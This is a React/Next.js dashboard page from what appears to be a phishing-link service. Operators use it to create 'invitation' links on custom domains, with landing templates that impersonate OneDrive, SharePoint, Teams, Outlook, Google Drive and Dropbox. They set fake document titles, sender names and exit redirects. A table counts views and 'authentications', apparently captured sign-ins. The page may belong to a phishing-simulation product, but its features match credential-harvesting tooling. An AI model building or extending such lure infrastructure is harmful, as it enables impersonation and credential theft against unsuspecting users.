"use client";

import { useEffect, useState } from "react";
import { LoadingText } from "@/components/ui/loading-text";
import { useSession } from "next-auth/react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Separator } from "@/components/ui/separator";
import {
  Copy,
  Check,
  Trash2,
  Pause,
  Play,
  Loader2,
  Link as LinkIcon,
  HelpCircle,
  Globe,
} from "lucide-react";
import { t } from "@/i18n";
import { toast } from "sonner";

interface Invitation {
  id: string;
  code: string;
  name: string;
  template: string;
  docType: string;
  documentTitle: string;
  senderName: string;
  notes: string | null;
  exitUrl: string | null;
  domainId: string | null;
  status: string;
  views: number;
  authentications: number;
  createdAt: string;
}

interface CustomDomain {
  id: string;
  domain: string;
  verified: boolean;
}

const TEMPLATES = [
  { value: "ONEDRIVE_FILE", labelKey: "templateOnedrive" as const },
  { value: "SHAREPOINT_DOCUMENT", labelKey: "templateSharepoint" as const },
  { value: "TEAMS_CHAT_FILE", labelKey: "templateTeams" as const },
  { value: "OUTLOOK_ENCRYPTED", labelKey: "templateOutlook" as const },
  { value: "GOOGLE_DRIVE", labelKey: "templateGoogleDrive" as const },
  { value: "DROPBOX_FILE", labelKey: "templateDropbox" as const },
];

const DOC_TYPES = ["PDF", "DOCX", "XLSX", "PPTX", "ZIP"];

function templateLabel(template: string): string {
  const found = TEMPLATES.find((tpl) => tpl.value === template);
  return found ? t(found.labelKey) : template;
}

export default function InvitationsPage() {
  const { data: session, status } = useSession();
  const hasActiveSubscription = (session?.user as { hasActiveSubscription?: boolean })?.hasActiveSubscription;
  const role = (session?.user as { role?: string })?.role;
  const canAccess = hasActiveSubscription || role === "ADMIN";

  const [invitations, setInvitations] = useState<Invitation[]>([]);
  const [loading, setLoading] = useState(true);
  const [creating, setCreating] = useState(false);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [lastCreated, setLastCreated] = useState<Invitation | null>(null);
  const [lastCreatedCopied, setLastCreatedCopied] = useState(false);

  // Domains state
  const [domains, setDomains] = useState<CustomDomain[]>([]);
  const [allDomains, setAllDomains] = useState<CustomDomain[]>([]);
  const [selectedDomainId, setSelectedDomainId] = useState<string | null>(null);
  const [linkModalUrl, setLinkModalUrl] = useState<string | null>(null);

  // Form state
  const [name, setName] = useState("");
  const [template, setTemplate] = useState("ONEDRIVE_FILE");
  const [docType, setDocType] = useState("PDF");
  const [documentTitle, setDocumentTitle] = useState("");
  const [senderName, setSenderName] = useState("");
  const [exitUrl, setExitUrl] = useState("");
  const [notes, setNotes] = useState("");

  const loadInvitations = () => {
    setLoading(true);
    fetch("/api/invitations")
      .then((r) => (r.ok ? r.json() : null))
      .then((data) => {
        if (data) setInvitations(data.invitations || []);
        setLoading(false);
      })
      .catch(() => setLoading(false));
  };

  useEffect(() => {
    if (status !== "authenticated") return;
    loadInvitations();
    fetch("/api/domains?active=1")
      .then((r) => (r.ok ? r.json() : null))
      .then((data) => {
        if (data) setDomains(data.domains || []);
      })
      .catch(() => {});
    fetch("/api/domains")
      .then((r) => (r.ok ? r.json() : null))
      .then((data) => {
        if (data) setAllDomains(data.domains || []);
      })
      .catch(() => {});
  }, [status]);

  const handleCreate = async () => {
    if (!name || !documentTitle || !senderName) return;
    setCreating(true);
    try {
      const res = await fetch("/api/invitations", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name, template, docType, documentTitle, senderName, notes, exitUrl, domainId: selectedDomainId }),
      });
      if (res.ok) {
        const data = await res.json();
        setLastCreated(data.invitation);
        setLastCreatedCopied(false);
        setName("");
        setDocumentTitle("");
        setSenderName("");
        setExitUrl("");
        setNotes("");
        loadInvitations();
      }
    } catch {
      toast.error(t("error"));
    } finally {
      setCreating(false);
    }
  };

  const handleToggleStatus = async (inv: Invitation) => {
    const newStatus = inv.status === "ACTIVE" ? "PAUSED" : "ACTIVE";
    try {
      const res = await fetch(`/api/invitations/${inv.id}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ status: newStatus }),
      });
      if (res.ok) {
        setInvitations((prev) =>
          prev.map((i) => (i.id === inv.id ? { ...i, status: newStatus } : i))
        );
      }
    } catch {
      toast.error(t("error"));
    }
  };

  const handleDelete = async (id: string) => {
    if (!confirm(t("deleteInvitation") + "?")) return;
    try {
      const res = await fetch(`/api/invitations/${id}`, { method: "DELETE" });
      if (res.ok) {
        setInvitations((prev) => prev.filter((i) => i.id !== id));
      }
    } catch {
      toast.error(t("error"));
    }
  };

  const getLink = (inv: Invitation) => {
    if (inv.domainId) {
      const domain = allDomains.find((d) => d.id === inv.domainId);
      if (domain) return `https://${domain.domain}/i/${inv.code}`;
    }
    return `${window.location.origin}/i/${inv.code}`;
  };

  const getDomainName = (inv: Invitation) => {
    if (!inv.domainId) return null;
    return allDomains.find((d) => d.id === inv.domainId)?.domain ?? null;
  };

  const getLastCreatedLink = (inv: Invitation) => {
    if (selectedDomainId) {
      const domain = domains.find((d) => d.id === selectedDomainId);
      if (domain) return `https://${domain.domain}/i/${inv.code}`;
    }
    return `${window.location.origin}/i/${inv.code}`;
  };

  const handleCopy = (inv: Invitation) => {
    navigator.clipboard.writeText(getLink(inv));
    setCopiedId(inv.id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleCopyLastCreated = () => {
    if (!lastCreated) return;
    navigator.clipboard.writeText(getLastCreatedLink(lastCreated));
    setLastCreatedCopied(true);
    setTimeout(() => setLastCreatedCopied(false), 2000);
  };

  if (!canAccess) {
    return (
      <div className="flex items-center justify-center py-20">
        <p className="text-muted-foreground">{t("subscriptionRequired")}</p>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center py-20">
        <p className="text-muted-foreground"><LoadingText className="text-muted-foreground" /></p>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      <h1 className="text-3xl font-bold">{t("invitations")}</h1>

      {/* Create Invitation Form */}
      <Card>
        <CardHeader>
          <CardTitle>{t("createInvitation")}</CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid gap-4 md:grid-cols-2">
            <div className="space-y-2">
              <Label>{t("invitationName")}</Label>
              <Input
                value={name}
                onChange={(e) => setName(e.target.value)}
                placeholder={t("invitationNamePlaceholder")}
              />
            </div>
            <div className="space-y-2">
              <Label>{t("landingTemplate")}</Label>
              <Select value={template} onValueChange={(v) => v && setTemplate(v)}>
                <SelectTrigger className="w-full">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {TEMPLATES.map((tpl) => (
                    <SelectItem key={tpl.value} value={tpl.value}>
                      {t(tpl.labelKey)}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <div className="space-y-2">
              <Label>{t("docType")}</Label>
              <Select value={docType} onValueChange={(v) => v && setDocType(v)}>
                <SelectTrigger className="w-full">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {DOC_TYPES.map((dt) => (
                    <SelectItem key={dt} value={dt}>
                      {dt}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <div className="space-y-2">
              <Label>{t("documentTitle")}</Label>
              <Input
                value={documentTitle}
                onChange={(e) => setDocumentTitle(e.target.value)}
                placeholder={t("documentTitlePlaceholder")}
              />
            </div>
            <div className="space-y-2">
              <Label>{t("senderName")}</Label>
              <Input
                value={senderName}
                onChange={(e) => setSenderName(e.target.value)}
                placeholder={t("senderNamePlaceholder")}
              />
            </div>
            <div className="space-y-2">
              <Label>{t("exitUrlLabel")}</Label>
              <Input
                value={exitUrl}
                onChange={(e) => setExitUrl(e.target.value)}
                placeholder={t("exitUrlPlaceholder")}
              />
            </div>
          </div>
          <div className="space-y-2">
            <Label>{t("notesLabel")}</Label>
            <Input
              value={notes}
              onChange={(e) => setNotes(e.target.value)}
              placeholder={t("notesPlaceholder")}
            />
          </div>
          {domains.length > 0 && (
            <div className="space-y-2">
              <Label>{t("selectDomain")}</Label>
              <Select
                value={selectedDomainId ?? "default"}
                onValueChange={(v) => setSelectedDomainId(v === "default" ? null : v)}
              >
                <SelectTrigger className="w-full max-w-sm">
                  <SelectValue placeholder={t("defaultDomain")}>
                    {selectedDomainId
                      ? domains.find((d) => d.id === selectedDomainId)?.domain ?? t("defaultDomain")
                      : t("defaultDomain")}
                  </SelectValue>
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="default">{t("defaultDomain")}</SelectItem>
                  {domains.map((d) => (
                    <SelectItem key={d.id} value={d.id}>
                      {d.domain}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
          )}
          <Button onClick={handleCreate} disabled={creating || !name || !documentTitle || !senderName}>
            {creating ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                {t("loading")}
              </>
            ) : (
              t("createInvitation")
            )}
          </Button>
        </CardContent>
      </Card>

      {/* Last created invitation link */}
      {lastCreated && (
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <LinkIcon className="h-5 w-5" />
              {t("invitationLink")}
            </CardTitle>
            <CardDescription>{t("invitationCreated")}</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="flex items-center gap-2">
              <code className="flex-1 rounded border border-border bg-muted px-3 py-2 text-sm">
                {getLastCreatedLink(lastCreated)}
              </code>
              <Button variant="outline" size="sm" onClick={handleCopyLastCreated}>
                {lastCreatedCopied ? (
                  <Check className="h-4 w-4 text-green-500" />
                ) : (
                  <Copy className="h-4 w-4" />
                )}
              </Button>
            </div>
          </CardContent>
        </Card>
      )}

      <Separator />

      {/* Invitations Table */}
      <Card>
        <CardHeader>
          <CardTitle>{t("invitations")}</CardTitle>
          <CardDescription>
            {invitations.length} {t("totalOf", { count: String(invitations.length) })}
          </CardDescription>
        </CardHeader>
        <CardContent>
          {invitations.length === 0 ? (
            <div className="py-12 text-center">
              <p className="text-muted-foreground">{t("noInvitations")}</p>
            </div>
          ) : (
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>{t("invitationName")}</TableHead>
                  <TableHead>{t("landingTemplate")}</TableHead>
                  <TableHead>{t("documentTitle")}</TableHead>
                  <TableHead>{t("status")}</TableHead>
                  <TableHead>{t("invitationViews")}</TableHead>
                  <TableHead>{t("invitationAuths")}</TableHead>
                  <TableHead>{t("invitationDomain")}</TableHead>
                  <TableHead>{t("invitationLink")}</TableHead>
                  <TableHead>{t("actions")}</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {invitations.map((inv) => (
                  <TableRow key={inv.id}>
                    <TableCell className="font-medium">{inv.name}</TableCell>
                    <TableCell className="text-sm">{templateLabel(inv.template)}</TableCell>
                    <TableCell className="text-sm">{inv.documentTitle}</TableCell>
                    <TableCell>
                      {inv.status === "ACTIVE" ? (
                        <Badge className="bg-green-600">{t("active")}</Badge>
                      ) : (
                        <Badge variant="secondary">{t("pauseInvitation")}</Badge>
                      )}
                    </TableCell>
                    <TableCell>{inv.views}</TableCell>
                    <TableCell>{inv.authentications}</TableCell>
                    <TableCell>
                      <div className="flex items-center gap-1">
                        <span className="text-sm text-muted-foreground">
                          {getDomainName(inv) || t("platformDomain")}
                        </span>
                        <button
                          onClick={() => setLinkModalUrl(getLink(inv))}
                          className="text-muted-foreground hover:text-foreground"
                        >
                          <HelpCircle className="h-3.5 w-3.5" />
                        </button>
                      </div>
                    </TableCell>
                    <TableCell>
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => handleCopy(inv)}
                      >
                        {copiedId === inv.id ? (
                          <>
                            <Check className="mr-1 h-3 w-3 text-green-500" />
                            {t("copied")}
                          </>
                        ) : (
                          <>
                            <Copy className="mr-1 h-3 w-3" />
                            {t("copyAddress")}
                          </>
                        )}
                      </Button>
                    </TableCell>
                    <TableCell>
                      <div className="flex gap-2">
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => handleToggleStatus(inv)}
                        >
                          {inv.status === "ACTIVE" ? (
                            <>
                              <Pause className="mr-1 h-3 w-3" />
                              {t("pauseInvitation")}
                            </>
                          ) : (
                            <>
                              <Play className="mr-1 h-3 w-3" />
                              {t("resumeInvitation")}
                            </>
                          )}
                        </Button>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => handleDelete(inv.id)}
                        >
                          <Trash2 className="h-3 w-3 text-destructive" />
                        </Button>
                      </div>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          )}
        </CardContent>
      </Card>

      <Dialog open={!!linkModalUrl} onOpenChange={() => setLinkModalUrl(null)}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Globe className="h-4 w-4" />
              {t("invitationFullLink")}
            </DialogTitle>
          </DialogHeader>
          <div className="flex items-center gap-2">
            <code className="flex-1 rounded border border-border bg-muted px-3 py-2 text-sm break-all">
              {linkModalUrl}
            </code>
            <Button
              variant="outline"
              size="sm"
              onClick={() => {
                if (linkModalUrl) {
                  navigator.clipboard.writeText(linkModalUrl);
                  toast.success(t("copied"));
                }
              }}
            >
              <Copy className="h-4 w-4" />
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
